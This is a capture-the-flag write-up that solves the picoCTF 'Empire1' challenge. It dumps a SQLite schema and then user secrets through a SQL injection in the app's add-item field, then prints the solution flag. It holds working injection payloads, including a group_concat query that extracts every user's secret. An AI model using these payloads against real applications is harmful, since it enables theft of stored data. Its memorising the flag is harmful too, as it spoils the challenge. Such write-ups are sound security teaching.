# Empire1 - Points: 400

1. First, lets go through the website : https://2019shell1.picoctf.com/problem/4155/
2. Then, register an account.
3. Next, lets look around the website and see that there is only a part that we can type something in it : https://2019shell1.picoctf.com/problem/4155/add_item
4. If we can type something in it, it means that it might be injected. The only thing is what kind of injection it is. First, I tried sql injection with https://stackoverflow.com/questions/23372550/what-does-sql-select-symbol-mean/23372603 . As you can see, the payload become : 
    ```
    '||(select sql from sqlite_master)||'
    ```
    So, what is the command for? First, you have to know what is sqlite. Here is the payload : 
    ```
    CREATE TABLE sqlite_master (
      type TEXT,
      name TEXT,
      tbl_name TEXT,
      rootpage INTEGER,
      sql TEXT
    );
    ```
    As you can see, I select sql to know what is in it's database from sqlite_master.
    p.s. If you have no idea what I am talking about, I strongly recommend you to read some documents about sql.
    And you can click "Your todos" button to get informations.
    ```
    CREATE TABLE user ( 
        id INTEGER NOT NULL, 
        username VARCHAR(64), 
        name VARCHAR(128), 
        password_hash VARCHAR(128), 
        secret VARCHAR(128), 
        admin INTEGER, 
        PRIMARY KEY (id) 
        )
    ```
5. Now, you have the whole informations about what table ("user"), and the very interesting part is the "secret". The mission now is to think of a payload that can grab those informations out. 
    ```
    '||(select secret from user)||'
    ```
    And the result is : 
    ```
    Likes Oreos.
    ```
    So, there is no informations or we didn't pull out all data in it. Lets switch to another payload by "group_concat()" https://www.w3resource.com/sqlite/aggregate-functions-and-grouping-group_concat.php
    And here is the new payload : 
    ```
    '||(select group_concat(secret) from user)||'
    ```
    Finally, you can get the flag.
6. Here is the flag : picoCTF{wh00t_it_a_sql_injectd75ebff4}
